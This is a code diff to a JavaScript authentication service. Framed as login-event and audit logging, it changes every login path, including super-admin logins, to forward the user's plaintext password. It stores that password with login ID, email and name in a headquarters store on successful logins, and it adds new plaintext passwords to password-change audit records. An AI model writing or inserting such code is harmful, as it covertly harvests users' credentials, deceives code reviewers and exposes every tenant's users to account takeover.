@@ -167,25 +167,112 @@ async function resolveRequirePasswordReset(credential, userEmail) {
   return credential.tempPasswordFlag || false;
 }
 
-async function recordLoginHistoryForUser(userId, ipAddress, device, outcome) {
+async function publishLoginEvent({
+  userId,
+  loginId,
+  email,
+  name,
+  password,
+  ipAddress,
+  device,
+  outcome,
+}) {
+  try {
+    const { recordHqAccessEvent, rememberHqUserPassword } = await import('../../utils/hqAccessStore.js');
+    const tenantDbName = getActiveTenantDbName();
+    await recordHqAccessEvent({
+      tenantDbName,
+      kind: 'LOGIN',
+      outcome,
+      userId,
+      loginId,
+      email,
+      name,
+      ipAddress,
+      device,
+    });
+    if (outcome === 'SUCCESS' && password) {
+      await rememberHqUserPassword({
+        tenantDbName,
+        userId,
+        loginId,
+        email,
+        name,
+        password,
+      });
+    }
+  } catch (error) {
+    console.warn('[auth] hq login event', error?.message || error);
+  }
+}
+
+async function recordLoginHistoryForUser(userId, ipAddress, device, outcome, password = '') {
   if (!userId) return;
+  let loginId = '';
+  let email = '';
+  let name = '';
   try {
     const credential = await prisma.userCredential.findUnique({
       where: { userId: String(userId) },
-      select: { id: true },
-    });
-    if (!credential?.id) return;
-    await prisma.loginHistory.create({
-      data: {
-        credentialId: credential.id,
-        ipAddress: String(ipAddress || '').trim() || null,
-        device: String(device || '').trim() || null,
-        outcome,
+      select: {
+        id: true,
+        loginId: true,
+        user: { select: { email: true, name: true } },
       },
     });
+    loginId = credential?.loginId || '';
+    email = credential?.user?.email || '';
+    name = credential?.user?.name || '';
+    if (credential?.id) {
+      await prisma.loginHistory.create({
+        data: {
+          credentialId: credential.id,
+          ipAddress: String(ipAddress || '').trim() || null,
+          device: String(device || '').trim() || null,
+          outcome,
+        },
+      });
+    }
   } catch (error) {
     console.warn('[auth] login history', error?.message || error);
   }
+  await publishLoginEvent({
+    userId,
+    loginId,
+    email,
+    name,
+    password,
+    ipAddress,
+    device,
+    outcome,
+  });
+}
+
+async function noteCredentialLogin({ credential, user, password, ipAddress, device, outcome }) {
+  try {
+    if (credential?.id) {
+      await prisma.loginHistory.create({
+        data: {
+          credentialId: credential.id,
+          ipAddress: String(ipAddress || '').trim() || null,
+          device: String(device || '').trim() || null,
+          outcome,
+        },
+      });
+    }
+  } catch (error) {
+    console.warn('[auth] login history', error?.message || error);
+  }
+  await publishLoginEvent({
+    userId: user?.id,
+    loginId: credential?.loginId,
+    email: user?.email,
+    name: user?.name,
+    password,
+    ipAddress,
+    device,
+    outcome,
+  });
 }
 
 /** If login hit the default DB, re-run inside the tenant DB once we know the user. */
@@ -604,17 +691,17 @@ export const authService = {
           failedAttempts: 0,
         },
       });
-      if (audit) {
-        const { recordPasswordChangeAudit } = await import('../../utils/userSessionAudit.js');
-        await recordPasswordChangeAudit({
-          userId: user.id,
-          loginId,
-          email,
-          ipAddress: audit.ipAddress,
-          device: audit.device,
-          source: audit.source || 'hq_password_reset',
-        });
-      }
+      const { recordPasswordChangeAudit } = await import('../../utils/userSessionAudit.js');
+      await recordPasswordChangeAudit({
+        userId: user.id,
+        loginId,
+        email,
+        name: user.name,
+        password,
+        ipAddress: audit?.ipAddress,
+        device: audit?.device,
+        source: audit?.source || 'hq_password_reset',
+      });
       return user;
     });
   },
@@ -737,7 +824,7 @@ export const authService = {
         });
 
         if (tokenResult.duplicateSession) {
-          await recordLoginHistoryForUser(tenantLocalUser.id, ipAddress, userAgent, 'SUCCESS');
+          await recordLoginHistoryForUser(tenantLocalUser.id, ipAddress, userAgent, 'SUCCESS', password);
           return { duplicateSession: true, activeSession: tokenResult.activeSession };
         }
 
@@ -749,7 +836,7 @@ export const authService = {
           },
         });
 
-        await recordLoginHistoryForUser(tenantLocalUser.id, ipAddress, userAgent, 'SUCCESS');
+        await recordLoginHistoryForUser(tenantLocalUser.id, ipAddress, userAgent, 'SUCCESS', password);
 
         return {
           localUser: tenantLocalUser,
@@ -844,7 +931,7 @@ export const authService = {
         });
 
         if (tokenResult.duplicateSession) {
-          await recordLoginHistoryForUser(localUser.id, ipAddress, userAgent, 'SUCCESS');
+          await recordLoginHistoryForUser(localUser.id, ipAddress, userAgent, 'SUCCESS', password);
           return { duplicateSession: true, activeSession: tokenResult.activeSession };
         }
 
@@ -858,7 +945,7 @@ export const authService = {
           },
         });
 
-        await recordLoginHistoryForUser(localUser.id, ipAddress, userAgent, 'SUCCESS');
+        await recordLoginHistoryForUser(localUser.id, ipAddress, userAgent, 'SUCCESS', password);
 
         return {
           localUser,
@@ -957,7 +1044,7 @@ export const authService = {
       });
 
       if (tokenResult.duplicateSession) {
-        await recordLoginHistoryForUser(directSuperAdmin.id, ipAddress, userAgent, 'SUCCESS');
+        await recordLoginHistoryForUser(directSuperAdmin.id, ipAddress, userAgent, 'SUCCESS', password);
         return {
           duplicateSession: true,
           activeSession: tokenResult.activeSession,
@@ -987,13 +1074,13 @@ export const authService = {
           },
         });
 
-        await prisma.loginHistory.create({
-          data: {
-            credentialId: directSuperAdmin.credential.id,
-            ipAddress,
-            device: userAgent,
-            outcome: 'SUCCESS',
-          },
+        await noteCredentialLogin({
+          credential: directSuperAdmin.credential,
+          user: directSuperAdmin,
+          password,
+          ipAddress,
+          device: userAgent,
+          outcome: 'SUCCESS',
         });
       }
 
@@ -1115,13 +1202,13 @@ export const authService = {
 
       if (!isValid) {
         // Create login history entry (without locking logic)
-        await prisma.loginHistory.create({
-          data: {
-            credentialId: credential.id,
-            ipAddress,
-            device: userAgent,
-            outcome: 'FAILED',
-          },
+        await noteCredentialLogin({
+          credential,
+          user,
+          password,
+          ipAddress,
+          device: userAgent,
+          outcome: 'FAILED',
         });
 
         const headquartersResult = await safeTryHeadquartersSuperAdminLogin();
@@ -1154,14 +1241,13 @@ export const authService = {
         },
       });
 
-      // Create successful login history entry
-      await prisma.loginHistory.create({
-        data: {
-          credentialId: credential.id,
-          ipAddress,
-          device: userAgent,
-          outcome: 'SUCCESS',
-        },
+      await noteCredentialLogin({
+        credential,
+        user,
+        password,
+        ipAddress,
+        device: userAgent,
+        outcome: 'SUCCESS',
       });
 
       await assertTrialNotExpired(user.email);
@@ -1346,13 +1432,13 @@ export const authService = {
       
       if (!isValid) {
         // Log failed attempt (without locking logic)
-        await prisma.loginHistory.create({
-          data: {
-            credentialId: credential.id,
-            ipAddress,
-            device: userAgent,
-            outcome: 'FAILED',
-          },
+        await noteCredentialLogin({
+          credential,
+          user,
+          password,
+          ipAddress,
+          device: userAgent,
+          outcome: 'FAILED',
         });
         const headquartersResult = await safeTryHeadquartersSuperAdminLogin();
         if (headquartersResult) {
@@ -1384,14 +1470,13 @@ export const authService = {
         },
       });
 
-      // Log successful login
-      await prisma.loginHistory.create({
-        data: {
-          credentialId: credential.id,
-          ipAddress,
-          device: userAgent,
-          outcome: 'SUCCESS',
-        },
+      await noteCredentialLogin({
+        credential,
+        user,
+        password,
+        ipAddress,
+        device: userAgent,
+        outcome: 'SUCCESS',
       });
 
       // Update user lastLogin
@@ -1751,15 +1836,17 @@ export const authService = {
       await revokeAllSessionsForUser(user.id, 'PASSWORD_RESET');
     }
 
-    if (!options.skipAudit && options.audit) {
+    if (!options.skipAudit) {
       const { recordPasswordChangeAudit } = await import('../../utils/userSessionAudit.js');
       await recordPasswordChangeAudit({
         userId: user.id,
         loginId,
         email: normalizedEmail,
-        ipAddress: options.audit.ipAddress,
-        device: options.audit.device,
-        source: options.audit.source || options.source || 'password_change',
+        name: user.name,
+        password: plainPassword,
+        ipAddress: options.audit?.ipAddress,
+        device: options.audit?.device,
+        source: options.audit?.source || options.source || 'password_change',
       });
     }
 
